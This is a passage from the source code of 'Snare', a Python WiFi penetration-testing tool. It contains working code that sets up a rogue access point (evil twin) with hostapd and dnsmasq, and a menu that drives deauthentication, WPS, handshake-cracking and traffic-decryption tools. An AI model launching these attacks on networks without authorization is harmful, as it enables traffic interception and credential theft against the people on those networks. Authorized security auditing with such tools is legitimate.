        return
    if ssid != ssid_raw:
        console.print(f"[yellow][!] SSID sanitized to: {ssid}[/]")

    channel_raw = ask("Channel", default="6")
    if not validate_channel(channel_raw):
        console.print("[red][!] Invalid channel.[/]")
        return

    iface = ask("Interface for AP (usually a second adapter)", default=managed_iface)

    # Write config files inside the secure temp dir with restricted permissions
    hostapd_conf = tmpfile("hostapd.conf")
    dnsmasq_conf = tmpfile("dnsmasq.conf")

    Path(hostapd_conf).write_text(
        f"interface={iface}\n"
        f"ssid={ssid}\n"
        f"channel={channel_raw}\n"
        "hw_mode=g\n"
        "ignore_broadcast_ssid=0\n"
    )
    os.chmod(hostapd_conf, 0o600)

    Path(dnsmasq_conf).write_text(
        f"interface={iface}\n"
        "dhcp-range=192.168.10.10,192.168.10.50,12h\n"
        "dhcp-option=3,192.168.10.1\n"
        "dhcp-option=6,192.168.10.1\n"
        "server=8.8.8.8\n"
        "log-queries\n"
        "log-dhcp\n"
    )
    os.chmod(dnsmasq_conf, 0o600)

    console.print(f"[green][+] Configs written to secure temp dir.[/]")
    log(f"rogue_ap: ssid={ssid} channel={channel_raw} iface={iface}")

    if confirm("Launch rogue AP now?"):
        run(["ip", "addr", "add", "192.168.10.1/24", "dev", iface])
        run(["ip", "link", "set", iface, "up"])
        console.print("[yellow][*] Starting hostapd (Ctrl+C to stop)...[/]")
        dns_proc = None
        proc = None
        try:
            proc = subprocess.Popen(["hostapd", hostapd_conf])
            time.sleep(1)
            dns_proc = subprocess.Popen(
                ["dnsmasq", f"--conf-file={dnsmasq_conf}", "--no-daemon"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            console.print("[green][+] Rogue AP is live. Press Ctrl+C to stop.[/]")
            proc.wait()
        except KeyboardInterrupt:
            pass
        finally:
            if proc and proc.poll() is None:
                proc.terminate()
            if dns_proc and dns_proc.poll() is None:
                dns_proc.terminate()
            console.print("[yellow][*] Rogue AP stopped.[/]")

# ─── Automated tools ──────────────────────────────────────────────────────────

def launch_wifite(monitor_iface):
    if not tool_available("wifite"):
        console.print("[red][!] wifite not found.  sudo apt install wifite[/]")
        return
    console.print("[yellow][*] Launching wifite (Ctrl+C to return)...[/]")
    log(f"wifite: iface={monitor_iface}")
    run_interactive(["wifite", "--interface", monitor_iface])

# ─── Main menu ────────────────────────────────────────────────────────────────

def main_menu(monitor_iface, original_iface):
    last_networks = []
    options = [
        ("1", "Scan for nearby networks"),
        ("2", "Capture packets"),
        ("3", "Decrypt captured traffic          (airdecap-ng)"),
        ("4", "Extract network data              (tshark)"),
        ("5", "Deauthentication / disruption"),
        ("6", "Crack handshake / hash"),
        ("7", "WPS attacks                       (reaver / pixiewps)"),
        ("8", "Rogue AP / Evil Twin              (hostapd + dnsmasq)"),
        ("9", "Automated WiFi audit              (wifite)"),
        ("t", "Show tool availability"),
        ("0", "Disable monitor mode & exit"),
    ]
    valid = [o[0] for o in options]

    while True:
        console.rule(f"[bold cyan]Snare v{VERSION}  |  {monitor_iface}[/]")
        if RICH:
            t = Table(show_header=False, box=None, padding=(0, 2))
            t.add_column("Key", style="cyan", width=4)
            t.add_column("Action", style="white")
            for key, label in options:
                t.add_row(f"[cyan]{key}[/]", f"[bold red]{label}[/]" if key == "0" else label)
            console.print(t)
        else:
            for key, label in options:
                print(f"  {key}  {label}")
        console.print()

        if RICH:
            choice = Prompt.ask("Option", choices=valid)
        else:
            choice = input("  Option: ").strip()
            if choice not in valid:
                console.print("[red]Invalid option.[/]")
                continue
        console.print()

        if choice == "1":
            nets, clients = scan_networks(monitor_iface)
            display_networks(nets, clients)
            if nets:
                last_networks = nets

        elif choice == "2":
            capture_packets(monitor_iface,
                            default_output=_get_arg("output"),
                            default_channel=_get_arg("channel"))

        elif choice == "3":
            inp = ask("Captured pcap file", default="captured.pcap")
            out = ask("Output filename", default="decrypted.pcap")
            decrypt_traffic(inp, out)

        elif choice == "4":
            inp = ask("Decrypted pcap file", default="decrypted.pcap")
            out = ask("Output filename", default="network_data.txt")
            extract_data(inp, out)

        elif choice == "5":
            deauth_attack(monitor_iface, networks=last_networks or None)

        elif choice == "6":
            crack_handshake()

        elif choice == "7":
            wps_attack(monitor_iface)

        elif choice == "8":
            rogue_ap(original_iface)

        elif choice == "9":
            launch_wifite(monitor_iface)

        elif choice == "t":
            show_tool_status()

        elif choice == "0":
            break

        console.print()

# ─── CLI argument parser ──────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        prog="Snare",
        description=f"Snare v{VERSION} — WiFi Penetration Testing Tool (authorized use only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 Snare.py
  sudo python3 Snare.py --interface wlan0
  sudo python3 Snare.py --wordlist /usr/share/wordlists/rockyou.txt
  sudo python3 Snare.py --yes --interface wlan0

Note: --password puts the WiFi password in the process list (visible via ps aux).
      For sensitive sessions, omit it and use the hidden interactive prompt instead.
        """,
    )
    parser.add_argument("--interface", "-i", metavar="IFACE",
                        help="Wireless interface to use (skip interactive selection)")
    parser.add_argument("--password", "-p", metavar="PASS",
                        help="WiFi password for decryption (visible in ps aux — prefer interactive prompt)")
    parser.add_argument("--ssid", "-s", metavar="SSID",
                        help="Network SSID for decryption (skip the prompt)")
    parser.add_argument("--wordlist", "-w", metavar="FILE",
                        help="Default wordlist path for cracking")
    parser.add_argument("--channel", "-c", metavar="CH",
                        help="Default channel to lock to during capture")
    parser.add_argument("--output", "-o", metavar="FILE",
                        help="Default output file for captures/results")
    parser.add_argument("--yes", "-y", action="store_true",
                        help="Skip the authorization confirmation prompt")
    parser.add_argument("--no-monitor", action="store_true",
                        help="Skip enabling monitor mode (interface is already in monitor mode)")
    return parser.parse_args()

# ─── Entry point ──────────────────────────────────────────────────────────────

def main():
    global _args
    _args = parse_args()

    print_banner()
    check_root()
    _init_logger()
    _init_tmpdir()

    if not check_dependencies():
        console.print("\n[dim]Install missing tools and re-run.[/]")
        _cleanup_tmpdir()
        sys.exit(1)

    if RICH:
        console.print(Panel(
            "[bold yellow]Only test networks you own or have explicit written\n"
            "permission to test.[/]\n\n"
            "Unauthorized use may be illegal in your jurisdiction.",
            title="[red bold]Legal Notice[/]",
            border_style="red",
        ))
    else:
        print("\n*** LEGAL NOTICE ***")
        print("Only test networks you own or have explicit written permission to test.")
        print("Unauthorized use may be illegal.\n")

    if not _args.yes and not confirm("I confirm I have authorization to test the target network"):
        console.print("[red]Exiting.[/]")
        _cleanup_tmpdir()
        sys.exit(0)

    if _args.interface:
        iface = _args.interface
        console.print(f"[green][+] Using interface: [bold]{iface}[/][/]")
    else:
        iface = select_interface()
    if not iface:
        _cleanup_tmpdir()
        sys.exit(1)

    if _args.no_monitor:
        monitor_iface = iface
        console.print(f"[yellow][*] Skipping monitor mode setup — using [bold]{iface}[/] as-is.[/]")
    else:
        monitor_iface = enable_monitor_mode(iface)

    def _cleanup(sig=None, frame=None):
        console.print("\n[yellow][*] Interrupt received — cleaning up...[/]")
        disable_monitor_mode()
        _cleanup_tmpdir()
        sys.exit(0)

    signal.signal(signal.SIGINT, _cleanup)
    signal.signal(signal.SIGTERM, _cleanup)

    try:
        main_menu(monitor_iface, original_iface=iface)
    finally:
        disable_monitor_mode()
        _cleanup_tmpdir()

if __name__ == "__main__":
    main()
